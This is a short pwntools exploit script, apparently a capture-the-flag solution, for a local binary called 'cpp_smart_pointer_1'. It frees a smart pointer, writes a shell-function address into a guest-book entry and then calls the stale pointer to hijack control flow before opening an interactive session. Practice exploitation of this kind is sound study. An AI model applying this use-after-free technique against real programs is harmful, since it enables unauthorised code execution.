from pwn import *
context.update(log_level='debug')

p = process('cpp_smart_pointer_1')

#delete smart pointer 1
p.recvrepeat(1)
p.sendline('2')
p.recvrepeat(1)
p.sendline('1')

#write guest book
p.recvrepeat(1)
p.sendline('4')
p.recvrepeat(1)
addr_shell = 0x40161d
addr_s_shell = hex(addr_shell)[2:]
p.sendline(addr_s_shell.encode('hex')[::-1] + '\x00'*(7 - len(addr_s_shell)))

#test smart pointer
p.recvrepeat(1)
p.sendline('3')

raw_input('debug: ' + str(p.pid))
p.interactive()

